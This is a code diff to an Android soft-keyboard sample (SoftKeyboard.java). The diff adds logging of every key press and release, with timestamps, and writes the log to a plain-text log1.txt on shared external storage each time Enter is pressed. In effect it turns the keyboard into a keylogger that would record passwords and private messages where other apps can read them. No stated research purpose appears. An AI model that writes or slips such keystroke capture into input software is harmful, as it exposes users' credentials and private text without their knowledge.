@@ -19,6 +19,7 @@ package com.example.android.softkeyboard;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
+import android.os.Environment;
 import android.text.method.MetaKeyKeyListener;
 import android.util.Log;
 import android.view.KeyCharacterMap;
@@ -30,7 +31,12 @@ import android.view.inputmethod.InputConnection;
 import android.view.inputmethod.InputMethodManager;
 import android.widget.Toast;
 
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Currency;
 import java.util.List;
 
 /**
@@ -74,6 +80,8 @@ public class SoftKeyboard extends InputMethodService
     
     private String mWordSeparators;
     
+    private KeyStrokesHolder keyStrokes;
+    
     /**
      * Main initialization of the input method component.  Be sure to call
      * to super class.
@@ -81,6 +89,7 @@ public class SoftKeyboard extends InputMethodService
     @Override public void onCreate() {
         super.onCreate();
         mWordSeparators = getResources().getString(R.string.word_separators);
+        keyStrokes = new KeyStrokesHolder();
     }
     
     /**
@@ -677,10 +686,45 @@ public class SoftKeyboard extends InputMethodService
     }
     
     public void onPress(int primaryCode) {
-    	long time =System.currentTimeMillis();
-    	Toast.makeText(this, "Hello " + time, Toast.LENGTH_LONG).show();
+    	//Toast.makeText(this, "Key Pressed: " + primaryCode, Toast.LENGTH_LONG).show();
+    	keyStrokes.keyStrokes.add(new KeyStroke((char)primaryCode, System.currentTimeMillis(), true) );
     }
     
     public void onRelease(int primaryCode) {
+    	//Toast.makeText(this, "Key Pressed: " + primaryCode, Toast.LENGTH_LONG).show();
+    	if(primaryCode == 10)
+    	{
+    		Toast.makeText(this, "enter presses", Toast.LENGTH_SHORT).show();
+    		File sdCard = Environment.getExternalStorageDirectory(); 
+    		File logFile = new File(sdCard.getAbsolutePath() + "/" + "log1.txt");
+    		try
+    		{
+    			if(logFile.canRead())
+    			{
+    				FileWriter fileWriter =  new FileWriter(logFile, true);
+    				BufferedWriter out = new BufferedWriter(fileWriter);
+    				for (KeyStroke keyStroke : keyStrokes.keyStrokes) {
+						out.write(keyStroke.key + " " + (keyStroke.isOnPress ? "OnPress" : "Release") + keyStroke.time);
+						out.write("\n");
+					}
+    				
+    				out.write("\n\n\n\n");
+    				out.close();
+    			}
+    			else
+    			{
+    				Toast.makeText(this, "Unabel to read file", Toast.LENGTH_SHORT).show();
+    			}
+    		}
+    		catch(IOException ioex)
+    		{
+    			
+    		}
+    		
+    		keyStrokes.keyStrokes = new ArrayList<KeyStroke>();
+    		return;
+    	}
+    	
+    	keyStrokes.keyStrokes.add(new KeyStroke((char)primaryCode, System.currentTimeMillis(), false));
     }
 }
